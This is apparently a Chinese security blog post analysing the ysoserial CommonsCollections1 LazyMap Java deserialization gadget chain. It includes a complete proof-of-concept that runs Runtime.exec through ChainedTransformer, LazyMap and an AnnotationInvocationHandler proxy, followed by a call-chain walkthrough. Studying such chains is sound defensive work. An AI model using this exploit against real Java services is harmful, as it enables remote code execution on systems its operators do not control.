## ysoserial_CommonCollections1_LazyMap

本文分析yso中的利用链

本机环境：

JDK版本：jdk1.7u_51

CC版本：Commons-Collections 3.1

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


public class CommonCollections1_yso {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map<Object, Object> map = new HashMap<>();
        Map lazymap = LazyMap.decorate(map, chainedTransformer);  //一旦调用get方法，就实现rce

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, lazymap);
        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),new Class[]{Map.class},handler);

        Object o = cons.newInstance(Retention.class,proxymap);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payload.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(o);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payload.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();

    }
}
```

运行该poc即可弹出计算器，注意在idea中调试时，需要将idea设置如下：

![image-20220310193842876](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220310193842876.png)

这是由于IDEA调试器会调用一些toString之类的方法，导致不经意间触发了命令。

## POC分析

利用链：

```java
ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
```

 这条链的前半部分和`TransformedMap`链相同，我们着重分析后半部分。

### LazyMap

我们先看第一部分POC：

```java
Map<Object, Object> map = new HashMap<>();
Map lazymap = LazyMap.decorate(map, chainedTransformer);  //一旦调用get方法，就实现rce
```

LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承AbstractMapDecorator。LazyMap的漏洞触发点和TransformedMap唯一的差别是，TransformedMap是在写入元素的时候执行transform，而LazyMap是在其get方法中执行的 factory.transform 。

```java
public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
```

在`LazyMap.decorate`方法中，会将传入的`chainedTransformer`作为Lazymap的factory属性

```java
 public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

在`LazyMap.get`方法中，如果map中没有key，就会调用factory的transform方法，来创造value并且放到map中，由于调用了transform方法，触发实现命令执行。

![image-20220310205203538](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220310205203538.png)

### AnnotationInvocationHandler

对于TransformedMap，`sun.reflect.annotation.AnnotationInvocationHandler `的readObject方法在调用setValue设置值的时候就会触发TransformedMap里注册的Transform，进而执行恶意代码。

但AnnotationInvocationHandler 的readObject方法中并没有直接调用到Map的get方法。这里我们要用到该类的invoke方法。

AnnotationInvocationHandler类的invoke方法有调用到get： 

![image-20220310210724800](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220310210724800.png)

看看这一部分POC：

```java
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = c.getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(Retention.class, lazymap);
        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),new Class[]{Map.class},handler);

        Object o = cons.newInstance(Retention.class,proxymap);
```

`Proxy.newProxyInstance `的第一个参数是ClassLoader，我们用默认的即可；第二个参数是我们需要

代理的对象集合；第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体代理的逻

辑。

这一部分涉及到动态代理的知识，**动态代理中当调用代理的方法时会进行触发handler中的invoke**

我们看到AnnotationInvocationHandler类的readObject方法：

![image-20220310220952689](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220310220952689.png)

这里参数 memberValues 可控，如果它是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。

而在invoke方法中对this.memberValues调用了get方法，如果此时this.memberValues为我们的map，那么就会触发LazyMap#get，从而完成触发rce。

简单来说就是，**代理一个Map类型，反序列化时通过 readObject 来触发 invoke，再触发 get 再触发 transform**从而执行恶意代码。









参考：

http://wjlshare.com/archives/1502
